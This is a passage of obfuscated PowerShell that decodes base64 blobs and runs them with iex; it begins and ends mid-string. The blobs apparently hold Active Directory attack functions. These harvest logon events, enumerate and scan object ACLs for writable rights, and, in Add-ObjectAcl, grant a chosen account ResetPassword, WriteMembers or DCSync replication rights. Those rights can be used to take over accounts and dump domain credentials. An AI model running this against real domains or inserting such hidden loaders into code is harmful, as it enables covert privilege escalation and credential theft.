AgICAgICAgICAgICAgICAgICAgICAnSUQnID0gJzQ2MjQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnTG9nb25UeXBlJyA9ICRMb2dvblR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdUaW1lJyA9ICRfLlRpbWVDcmVhdGVkCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRMb2dvbkV2ZW50UHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgcGFyc2luZyBldmVudCBsb2dzOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZigkSUQgLWNvbnRhaW5zIDQ3NjgpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmKCRfLm1lc3NhZ2UgLW1hdGNoICcoP3MpKD88PUFjY291bnQgSW5mb3JtYXRpb246KS4qPyg/PVNlcnZpY2UgSW5mb3JtYXRpb246KScpIHsKICAgICAgICAgICAgICAgICAgICBpZigkTWF0Y2hlcykgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlcm5hbWUgPSAkTWF0Y2hlc1swXS5zcGxpdCgiYG4iKVsxXS5zcGxpdCgiOiIpWzFdLnRyaW0oKQogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluID0gJE1hdGNoZXNbMF0uc3BsaXQoImBuIilbMl0uc3BsaXQoIjoiKVsxXS50cmltKCkKICAgICAgICAgICAgICAgICAgICAgICAgJE1hdGNoZXMgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKCRfLm1lc3NhZ2UgLW1hdGNoICcoP3MpKD88PU5ldHdvcmsgSW5mb3JtYXRpb246KS4qPyg/PUFkZGl0aW9uYWwgSW5mb3JtYXRpb246KScpIHsKICAgICAgICAgICAgICAgICAgICBpZigkTWF0Y2hlcykgewogICAgICAgICAgICAgICAgICAgICAgICAkQWRkcmVzcyA9ICRNYXRjaGVzWzBdLnNwbGl0KCJgbiIpWzFdLnNwbGl0KCI6IilbLTFdLnRyaW0oKQogICAgICAgICAgICAgICAgICAgICAgICAkTWF0Y2hlcyA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJExvZ29uRXZlbnRQcm9wZXJ0aWVzID0gQHsKICAgICAgICAgICAgICAgICAgICAnRG9tYWluJyA9ICREb21haW4KICAgICAgICAgICAgICAgICAgICAnQ29tcHV0ZXJOYW1lJyA9ICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAnVXNlcm5hbWUnID0gJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJ0FkZHJlc3MnID0gJEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICAnSUQnID0gJzQ3NjgnCiAgICAgICAgICAgICAgICAgICAgJ0xvZ29uVHlwZScgPSAnJwogICAgICAgICAgICAgICAgICAgICdUaW1lJyA9ICRfLlRpbWVDcmVhdGVkCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJExvZ29uRXZlbnRQcm9wZXJ0aWVzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtRGVidWcgIkVycm9yIHBhcnNpbmcgZXZlbnQgbG9nczogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU9iamVjdEFjbCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNhbUFjY291bnROYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWUgPSAiKiIsCiAgICAgICAgW0FsaWFzKCdETicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERpc3Rpbmd1aXNoZWROYW1lID0gIioiLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlc29sdmVHVUlEcywKICAgICAgICBbU3RyaW5nXQogICAgICAgICRGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwcmVmaXgsCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbVmFsaWRhdGVTZXQoIkFsbCIsIlJlc2V0UGFzc3dvcmQiLCJXcml0ZU1lbWJlcnMiKV0KICAgICAgICAkUmlnaHRzRmlsdGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgYmVnaW4gewogICAgICAgICRTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJEFEU3BhdGggLUFEU3ByZWZpeCAkQURTcHJlZml4IC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICBpZigkUmVzb2x2ZUdVSURzKSB7CiAgICAgICAgICAgICRHVUlEcyA9IEdldC1HVUlETWFwIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYgKCRTZWFyY2hlcikgewogICAgICAgICAgICBpZigkU2FtQWNjb3VudE5hbWUpIHsKICAgICAgICAgICAgICAgICRTZWFyY2hlci5maWx0ZXI9IigmKHNhbWFjY291bnRuYW1lPSRTYW1BY2NvdW50TmFtZSkobmFtZT0kTmFtZSkoZGlzdGluZ3Vpc2hlZG5hbWU9JERpc3Rpbmd1aXNoZWROYW1lKSRGaWx0ZXIpIiAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXIuZmlsdGVyPSIoJihuYW1lPSROYW1lKShkaXN0aW5ndWlzaGVkbmFtZT0kRGlzdGluZ3Vpc2hlZE5hbWUpJEZpbHRlcikiICAKICAgICAgICAgICAgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFNlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBbYWRzaV0oJF8ucGF0aCkKICAgICAgICAgICAgICAgICAgICBpZigkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRBY2Nlc3MgPSAkT2JqZWN0LlBzQmFzZS5PYmplY3RTZWN1cml0eS5hY2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgJEFjY2VzcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEROJyAoJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZVswXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRPYmplY3Qub2JqZWN0c2lkWzBdKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUyA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRPYmplY3Qub2JqZWN0c2lkWzBdLDApKS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFMgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0U0lEJyAkUwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYoJFJpZ2h0c0ZpbHRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAkR3VpZEZpbHRlciA9IFN3aXRjaCAoJFJpZ2h0c0ZpbHRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJlc2V0UGFzc3dvcmQiIHsgIjAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOSIgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIldyaXRlTWVtYmVycyIgeyAiYmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUyIiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWZhdWx0IHsgIjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCJ9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJF8uT2JqZWN0VHlwZSAtZXEgJEd1aWRGaWx0ZXIpIHsgJF8gfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmKCRHVUlEcykgewogICAgICAgICAgICAgICAgICAgICAgICAkQWNsUHJvcGVydGllcyA9IEB7fQogICAgICAgICAgICAgICAgICAgICAgICAkXy5wc29iamVjdC5wcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoICgkXy5OYW1lIC1lcSAnT2JqZWN0VHlwZScpIC1vciAoJF8uTmFtZSAtZXEgJ0luaGVyaXRlZE9iamVjdFR5cGUnKSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWNsUHJvcGVydGllc1skXy5OYW1lXSA9ICRHVUlEU1skXy5WYWx1ZS50b1N0cmluZygpXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBY2xQcm9wZXJ0aWVzWyRfLk5hbWVdID0gJF8uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWNsUHJvcGVydGllc1skXy5OYW1lXSA9ICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRBY2xQcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkXyB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkXwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLU9iamVjdEFjbCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldFNhbUFjY291bnROYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldE5hbWUgPSAiKiIsCiAgICAgICAgW0FsaWFzKCdETicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldERpc3Rpbmd1aXNoZWROYW1lID0gIioiLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldEZpbHRlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXRBRFNwYXRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldEFEU3ByZWZpeCwKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oJ15TLTEtNS0yMS1bMC05XSstWzAtOV0rLVswLTldKy1bMC05XSsnKV0KICAgICAgICAkUHJpbmNpcGFsU0lELAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFByaW5jaXBhbE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUHJpbmNpcGFsU2FtQWNjb3VudE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbVmFsaWRhdGVTZXQoIkFsbCIsIlJlc2V0UGFzc3dvcmQiLCJXcml0ZU1lbWJlcnMiLCJEQ1N5bmMiKV0KICAgICAgICAkUmlnaHRzID0gIkFsbCIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUmlnaHRzR1VJRCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGJlZ2luIHsKICAgICAgICAkU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1BRFNwYXRoICRUYXJnZXRBRFNwYXRoIC1BRFNwcmVmaXggJFRhcmdldEFEU3ByZWZpeCAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgaWYoISRQcmluY2lwYWxTSUQpIHsKICAgICAgICAgICAgJFByaW5jaXBhbCA9IEdldC1BRE9iamVjdCAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLU5hbWUgJFByaW5jaXBhbE5hbWUgLVNhbUFjY291bnROYW1lICRQcmluY2lwYWxTYW1BY2NvdW50TmFtZSAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgICAgIGlmKCEkUHJpbmNpcGFsKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAiRXJyb3IgcmVzb2x2aW5nIHByaW5jaXBhbCIKICAgICAgICAgICAgfQogICAgICAgICAgICAkUHJpbmNpcGFsU0lEID0gJFByaW5jaXBhbC5vYmplY3RzaWQKICAgICAgICB9CiAgICAgICAgaWYoISRQcmluY2lwYWxTSUQpIHsKICAgICAgICAgICAgdGhyb3cgIkVycm9yIHJlc29sdmluZyBwcmluY2lwYWwiCiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYgKCRTZWFyY2hlcikgewogICAgICAgICAgICBpZigkVGFyZ2V0U2FtQWNjb3VudE5hbWUpIHsKICAgICAgICAgICAgICAgICRTZWFyY2hlci5maWx0ZXI9IigmKHNhbWFjY291bnRuYW1lPSRUYXJnZXRTYW1BY2NvdW50TmFtZSkobmFtZT0kVGFyZ2V0TmFtZSkoZGlzdGluZ3Vpc2hlZG5hbWU9JFRhcmdldERpc3Rpbmd1aXNoZWROYW1lKSRUYXJnZXRGaWx0ZXIpIiAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXIuZmlsdGVyPSIoJihuYW1lPSRUYXJnZXROYW1lKShkaXN0aW5ndWlzaGVkbmFtZT0kVGFyZ2V0RGlzdGluZ3Vpc2hlZE5hbWUpJFRhcmdldEZpbHRlcikiICAKICAgICAgICAgICAgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFNlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRUYXJnZXRETiA9ICRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHkgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5JZGVudGl0eVJlZmVyZW5jZV0gKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0kUHJpbmNpcGFsU0lEKQogICAgICAgICAgICAgICAgICAgICRJbmhlcml0YW5jZVR5cGUgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5SW5oZXJpdGFuY2VdICJOb25lIgogICAgICAgICAgICAgICAgICAgICRDb250cm9sVHlwZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BY2Nlc3NDb250cm9sVHlwZV0gIkFsbG93IgogICAgICAgICAgICAgICAgICAgICRBQ0VzID0gQCgpCiAgICAgICAgICAgICAgICAgICAgaWYoJFJpZ2h0c0dVSUQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdVSURzID0gQCgkUmlnaHRzR1VJRCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHVUlEcyA9IFN3aXRjaCAoJFJpZ2h0cykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJlc2V0UGFzc3dvcmQiIHsgIjAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOSIgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIldyaXRlTWVtYmVycyIgeyAiYmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUyIiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRENTeW5jIiB7ICIxMTMxZjZhYS05YzA3LTExZDEtZjc5Zi0wMGMwNGZjMmRjZDIiLCAiMTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyIiwgIjg5ZTk1Yjc2LTQ0NGQtNGM2Mi05OTFhLTBmYWNiZWRhNjQwYyJ9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYoJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJEdVSUQgaW4gJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV3R1VJRCA9IE5ldy1PYmplY3QgR3VpZCAkR1VJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFEUmlnaHRzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdICJFeHRlbmRlZFJpZ2h0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFDRXMgKz0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAkSWRlbnRpdHksJEFEUmlnaHRzLCRDb250cm9sVHlwZSwkTmV3R1VJRCwkSW5oZXJpdGFuY2VUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRBRFJpZ2h0cyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5UmlnaHRzXSAiR2VuZXJpY0FsbCIKICAgICAgICAgICAgICAgICAgICAgICAgJEFDRXMgKz0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAkSWRlbnRpdHksJEFEUmlnaHRzLCRDb250cm9sVHlwZSwkSW5oZXJpdGFuY2VUeXBlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkdyYW50aW5nIHByaW5jaXBhbCAkUHJpbmNpcGFsU0lEICckUmlnaHRzJyBvbiAkKCRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRBQ0UgaW4gJEFDRXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkdyYW50aW5nIHByaW5jaXBhbCAkUHJpbmNpcGFsU0lEICckKCRBQ0UuT2JqZWN0VHlwZSknIHJpZ2h0cyBvbiAkKCRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IFthZHNpXSgkXy5wYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdC5Qc0Jhc2UuT2JqZWN0U2VjdXJpdHkuQWRkQWNjZXNzUnVsZSgkQUNFKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdC5Qc0Jhc2UuY29tbWl0Y2hhbmdlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBncmFudGluZyBwcmluY2lwYWwgJFByaW5jaXBhbFNJRCAnJFJpZ2h0cycgb24gJFRhcmdldEROIDogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUFDTFNjYW5uZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTYW1BY2NvdW50TmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lID0gIioiLAogICAgICAgIFtBbGlhcygnRE4nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREaXN0aW5ndWlzaGVkTmFtZSA9ICIqIiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwcmVmaXgsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVzb2x2ZUdVSURzLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgR2V0LU9iamVjdEFDTCBAUFNCb3VuZFBhcmFtZXRlcnMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSWRlbnRpdHlTSUQnICgkXy5JZGVudGl0eVJlZmVyZW5jZS5UcmFuc2xhdGUoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSkuVmFsdWUpCiAgICAgICAgJF8KICAgIH0gfCBXaGVyZS1PYmplY3QgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFtpbnRdKCRfLklkZW50aXR5U2lkLnNwbGl0KCItIilbLTFdKSAtZ2UgMTAwMAogICAgICAgIH0KICAgICAgICBjYXRjaCB7fQogICAgfSB8IFdoZXJlLU9iamVjdCB7CiAgICAgICAgKCRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtZXEgIkdlbmVyaWNBbGwiKSAtb3IgKCRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtbWF0Y2ggIldyaXRlIikgLW9yICgkXy5BY3RpdmVEaXJlY3RvcnlSaWdodHMgLW1hdGNoICJDcmVhdGUiKSAtb3IgKCRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtbWF0Y2ggIkRlbGV0ZSIpIC1vciAoKCRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtbWF0Y2ggIkV4dGVuZGVkUmlnaHQiKSAtYW5kICgkXy5BY2Nlc3NDb250cm9sVHlwZSAtZXEgIkFsbG93IikpCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdVSURNYXAgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgICRHVUlEcyA9IEB7JzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCcgPSAnQWxsJ30KICAgICRTY2hlbWFQYXRoID0gKEdldC1OZXRGb3Jlc3QpLnNjaGVtYS5uYW1lCiAgICAkU2NoZW1hU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgLUFEU3BhdGggJFNjaGVtYVBhdGggLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgaWYoJFNjaGVtYVNlYXJjaGVyKSB7CiAgICAgICAgJFNjaGVtYVNlYXJjaGVyLmZpbHRlciA9ICIoc2NoZW1hSURHVUlEPSopIgogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRTY2hlbWFTZWFyY2hlci5GaW5kQWxsKCkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRHVUlEc1soTmV3LU9iamVjdCBHdWlkICgsJF8ucHJvcGVydGllcy5zY2hlbWFpZGd1aWRbMF0pKS5HdWlkXSA9ICRfLnByb3BlcnRpZXMubmFtZVswXQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtRGVidWcgIkVycm9yIGluIGJ1aWxkaW5nIEdVSUQgbWFwOiAkXyIKICAgICAgICB9ICAgICAgCiAgICB9CiAgICAkUmlnaHRzU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgLUFEU3BhdGggJFNjaGVtYVBhdGgucmVwbGFjZSgiU2NoZW1hIiwiRXh0ZW5kZWQtUmlnaHRzIikgLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgaWYgKCRSaWdodHNTZWFyY2hlcikgewogICAgICAgICRSaWdodHNTZWFyY2hlci5maWx0ZXIgPSAiKG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCkiCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJpZ2h0c1NlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEdVSURzWyRfLnByb3BlcnRpZXMucmlnaHRzZ3VpZFswXS50b1N0cmluZygpXSA9ICRfLnByb3BlcnRpZXMubmFtZ